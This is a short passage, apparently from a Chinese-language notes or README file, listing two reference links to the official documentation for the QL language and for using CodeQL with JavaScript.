   - QL 语言 reference：[https://codeql.github.com/docs/ql-language-reference/](https://codeql.github.com/docs/ql-language-reference/)
   - CodeQL for JavaScript：[https://codeql.github.com/docs/codeql-language-guides/codeql-for-javascript/](https://codeql.github.com/docs/codeql-language-guides/codeql-for-javascript/)
